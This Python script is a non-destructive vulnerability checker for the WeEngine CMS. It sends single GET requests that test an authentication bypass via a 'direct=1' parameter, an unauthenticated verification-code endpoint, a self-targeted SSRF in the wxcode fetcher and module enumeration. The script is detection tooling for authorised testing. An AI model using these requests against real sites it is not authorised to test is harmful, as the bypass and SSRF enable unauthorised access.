#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WeEngine (微擎) unauthenticated-access checker
================================================
Safe-by-default detection for the issues described in the accompanying README:

  * WE7-5  unauthenticated invocation of a module backend endpoint
           (web/source/site/entry.ctrl.php — `direct` taken from the request when
           no modules_bindings row exists)
  * WE7-6  unauthenticated verification-code trigger
           (web/source/utility/verifycode.ctrl.php)
  * WE7-2  unauthenticated SSRF with response echo
           (web/source/utility/wxcode.ctrl.php, 1.7.x only)
  * WE7-4  unauthenticated installed-module enumeration (informational)

Design rules
------------
* NOTHING destructive: no create / update / delete requests, no file upload,
  no SMS/e-mail is actually sent (WE7-6 is probed with a deliberately malformed
  receiver, which the endpoint rejects before delivery).
* GET only, single request per check, no brute force, no payload lists.
* Use it only against systems you are authorised to test.

Usage
-----
    python3 we7_unauth_check.py -u http://127.0.0.1:8084
    python3 we7_unauth_check.py -u https://example.com -m xiaof_toupiao
    python3 we7_unauth_check.py -u https://example.com --json
"""

import argparse
import json
import sys
import urllib.parse
import urllib.request

# candidate entry points that are usually NOT declared in a module's manifest
# <bindings>; all of them are read-only pages / exports
CANDIDATE_DOS = ["diagnose", "excle", "excletop", "excledraw", "lists", "list", "setting"]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0 Safari/537.36")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Keep 3xx visible: the framework's auth check answers with a 302 to /login."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


opener = urllib.request.build_opener(NoRedirect)


def http_get(url, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(200000)
    except urllib.error.HTTPError as e:          # 3xx land here because of NoRedirect
        body = b""
        try:
            body = e.read(200000)
        except Exception:
            pass
        return e.code, dict(e.headers or {}), body
    except Exception as e:
        return None, {}, str(e).encode()


def entry_url(base, module, do, direct):
    q = urllib.parse.urlencode({"c": "site", "a": "entry", "m": module, "do": do, "direct": direct})
    return f"{base.rstrip('/')}/web/index.php?{q}"


def looks_like_login(status, headers, body):
    if status in (301, 302, 303, 307):
        return True
    low = body[:4000].lower()
    return b"login" in low and b"password" in low


def check_entry_bypass(base, module, do, timeout=15):
    """WE7-5: direct=0 must bounce to login, direct=1 must reach the module."""
    s0, h0, b0 = http_get(entry_url(base, module, do, 0), timeout)
    s1, h1, b1 = http_get(entry_url(base, module, do, 1), timeout)
    result = {
        "module": module,
        "do": do,
        "direct=0": {"status": s0, "bytes": len(b0), "location": h0.get("Location", "")},
        "direct=1": {"status": s1, "bytes": len(b1), "location": h1.get("Location", "")},
    }
    blocked_without_direct = looks_like_login(s0, h0, b0)
    reached_with_direct = (s1 == 200 and len(b1) > 200 and not looks_like_login(s1, h1, b1))
    if blocked_without_direct and reached_with_direct:
        result["verdict"] = "VULNERABLE (unauthenticated access via direct=1)"
    elif s1 in (301, 302, 303, 307):
        result["verdict"] = "not reachable (binding row exists -> checklogin() enforced)"
    else:
        result["verdict"] = "inconclusive"
    return result


def check_module_enum(base, timeout=15):
    url = f"{base.rstrip('/')}/web/index.php?c=utility&a=modules&do=list"
    s, h, b = http_get(url, timeout)
    body = b.decode("utf-8", "replace")
    return {"check": "WE7-4 module enumeration", "status": s,
            "exposed": s == 200 and '"items"' in body,
            "sample": body[:200]}


def check_verifycode(base, timeout=15):
    """WE7-6. The receiver is intentionally malformed so the endpoint rejects the
    request *before* any message is generated or sent."""
    url = (f"{base.rstrip('/')}/web/index.php?c=utility&a=verifycode"
           f"&do=send_code&receiver=not-a-valid-address")
    s, h, b = http_get(url, timeout)
    body = b.decode("utf-8", "replace")
    # 微擎 answers ajax calls with a JSON envelope (unicode-escaped), e.g.
    # {"message":{"errno":-1,"message":"\u60a8\u8f93\u5165\u7684\u90ae\u7bb1..."}}
    # A login redirect would be HTML/3xx instead.
    unauth_reached = s == 200 and body.lstrip().startswith("{")
    return {"check": "WE7-6 unauthenticated code trigger", "status": s,
            "endpoint_reachable_without_login": unauth_reached,
            "note": "malformed receiver -> rejected before delivery, nothing was sent",
            "sample": body[:200]}


def check_ssrf(base, timeout=15):
    """WE7-2. Points the fetcher at the site itself (self-SSRF) — no third party."""
    target = base.rstrip("/") + "/web/index.php"
    url = (f"{base.rstrip('/')}/web/index.php?c=utility&a=wxcode&do=image"
           f"&attach={urllib.parse.quote(target, safe='')}")
    s, h, b = http_get(url, timeout)
    body = b.decode("utf-8", "replace")
    return {"check": "WE7-2 SSRF (1.7.x)", "status": s,
            "echoed_content": len(b) > 200 and "<" in body,
            "note": "harmless: destination is the target itself",
            "sample": body[:160]}


def main():
    ap = argparse.ArgumentParser(description="WeEngine unauthenticated-access checker (non-destructive)")
    ap.add_argument("-u", "--url", required=True, help="base URL, e.g. http://127.0.0.1:8084")
    ap.add_argument("-m", "--module", action="append", default=[],
                    help="installed module name to test (repeatable). Default: test every module found by WE7-4")
    ap.add_argument("-d", "--do", action="append", default=[],
                    help="entry name to test (repeatable). Default: built-in read-only candidates")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    base = args.url if "://" in args.url else "http://" + args.url
    report = {"target": base, "checks": []}

    enum = check_module_enum(base, args.timeout)
    report["checks"].append(enum)

    modules = args.module
    if not modules:
        print("[i] no --module given; module enumeration alone does not list third-party entries,")
        print("    so WE7-5 needs at least one module name. Example: -m xiaof_toupiao")
        modules = []

    dos = args.do or CANDIDATE_DOS
    hits = []
    for m in modules:
        for d in dos:
            r = check_entry_bypass(base, m, d, args.timeout)
            report["checks"].append({"check": "WE7-5 entry bypass", **r})
            if r["verdict"].startswith("VULNERABLE"):
                hits.append(f"{m}?do={d}")

    if modules:
        report["checks"].append(check_verifycode(base, args.timeout))
        report["checks"].append(check_ssrf(base, args.timeout))

    report["summary"] = {
        "WE7-5_vulnerable_entries": hits,
        "verdict": "VULNERABLE" if hits else "no unauthenticated entry reached (or no module supplied)",
    }

    if args.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
    else:
        print(f"\n=== target: {base} ===")
        for c in report["checks"]:
            if c.get("check") == "WE7-5 entry bypass":
                print(f"  [WE7-5] {c['module']}?do={c['do']:<12} "
                      f"direct=0 -> {c['direct=0']['status']:<3} | "
                      f"direct=1 -> {c['direct=1']['status']:<3} | {c['verdict']}")
            elif c.get("check", "").startswith("WE7-4"):
                print(f"  [WE7-4] module enumeration exposed: {c['exposed']} (HTTP {c['status']})")
            elif c.get("check", "").startswith("WE7-6"):
                print(f"  [WE7-6] endpoint reachable without login: {c['endpoint_reachable_without_login']} "
                      f"(HTTP {c['status']}) — nothing was sent")
            elif c.get("check", "").startswith("WE7-2"):
                print(f"  [WE7-2] response echoed back: {c['echoed_content']} (HTTP {c['status']})")
        print(f"\nsummary: {report['summary']['verdict']}")
        if hits:
            print("vulnerable entries: " + ", ".join(hits))

    return 0


if __name__ == "__main__":
    sys.exit(main())
